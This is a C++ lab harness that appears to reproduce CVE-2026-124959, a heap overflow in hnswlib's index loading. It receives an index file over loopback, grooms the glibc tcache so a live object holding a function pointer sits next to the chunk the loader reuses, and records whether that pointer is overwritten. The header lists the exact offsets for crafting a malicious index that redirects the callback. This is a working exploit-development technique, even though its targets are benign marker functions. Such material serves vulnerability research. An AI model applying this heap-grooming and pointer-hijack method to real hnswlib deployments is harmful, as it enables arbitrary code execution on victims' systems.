/*
 * Lab-only consumer variant for CVE-2026-124959: heap-groomed live neighbour.
 *
 * Same loopback receive and ordinary pinned v0.9.0 load constructor as
 * service.cpp, plus a deterministic glibc tcache layout: a 0x110 chunk G is
 * allocated immediately before a LIVE CacheEntry V, then G is freed. The
 * library's own malloc(256) at hnswalg.h:776 reuses G from tcache, so the
 * following chunk is V and the bulk read at :779 writes V's header and fields.
 * No library source is patched and no malloc interposer is used.
 *
 * V field offsets relative to data_level0_memory_ (dst):
 *   dst+256 V prev_size, dst+264 V size, dst+272 V.magic,
 *   dst+280 V.callback, dst+288 V.refcount, dst+296 V.label.
 * The index carries its level0 image at file offset 96, so file offsets are
 * 96 + (those offsets).
 */
#include "hnswlib/hnswalg.h"
#include <arpa/inet.h>
#include <csignal>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <exception>
#include <fstream>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

struct CacheEntry {
  uint64_t magic;
  uint64_t callback;
  uint64_t refcount;
  char label[32];
};

/* Benign target for an optional call-through-pointer observation under gdb. */
static void benign_marker2(void) {
  fprintf(stdout, "BENIGN_MARKER_EXECUTED\n");
  fflush(stdout);
}

/* Distinct target: the crafted index chooses this address, not the original. */
static void benign_marker3(void) {
  fprintf(stdout, "BENIGN_MARKER3_EXECUTED\n");
  fflush(stdout);
}
int main(int argc, char **argv) {
  if (argc != 3) {
    fprintf(stderr, "usage: victim PORT RECEIVED_INDEX_PATH\n");
    return 2;
  }
  const int port = atoi(argv[1]);
  const std::string path = argv[2];
  signal(SIGPIPE, SIG_IGN);

  int s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) { perror("socket"); return 2; }
  int one = 1;
  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
  struct sockaddr_in a;
  memset(&a, 0, sizeof(a));
  a.sin_family = AF_INET;
  a.sin_port = htons((uint16_t)port);
  a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (bind(s, (struct sockaddr *)&a, sizeof(a)) != 0) { perror("bind"); return 2; }
  if (listen(s, 1) != 0) { perror("listen"); return 2; }
  printf("victim_service_ready pid=%d port=%d\n", (int)getpid(), port);
  fflush(stdout);

  int c = accept(s, nullptr, nullptr);
  if (c < 0) { perror("accept"); return 2; }
  std::ofstream out(path, std::ios::binary | std::ios::trunc);
  char buf[65536];
  size_t total = 0;
  ssize_t n;
  while ((n = recv(c, buf, sizeof(buf), 0)) > 0) {
    out.write(buf, n);
    total += (size_t)n;
  }
  out.close();
  close(c);
  close(s);
  printf("victim_service_received bytes=%zu\n", total);
  fflush(stdout);

  hnswlib::L2Space space(21);

  /* Place a live object directly after the chunk the loader will reuse. */
  void *G = malloc(256);
  CacheEntry *V = new CacheEntry();
  V->magic = 0x43414348454e5452ULL;
  V->callback = (uint64_t)(uintptr_t)&benign_marker2;
  V->refcount = 1;
  memset(V->label, 'C', sizeof(V->label));
  free(G); /* tcache[0x110] = G; V is the next physical chunk. */

  printf("groom G=%p V=%p delta=%ld V_size_field=0x%lx callback_before=0x%lx top_size_before=0x%lx\n",
         G, (void *)V, (long)((char *)V - (char *)G),
         *(unsigned long *)((char *)V - 8), (unsigned long)V->callback,
         *(unsigned long *)((char *)V + 56));
  fflush(stdout);

  try {
    hnswlib::HierarchicalNSW<float> idx(&space, path);
    printf("victim_load=loaded\n");
  } catch (const std::exception &e) {
    printf("victim_load=exception what=%s\n", e.what());
  }
  printf("AFTER_LOAD magic=0x%lx callback=0x%lx refcount=0x%lx\n",
         (unsigned long)V->magic, (unsigned long)V->callback,
         (unsigned long)V->refcount);
  fflush(stdout);
  return 0;
}
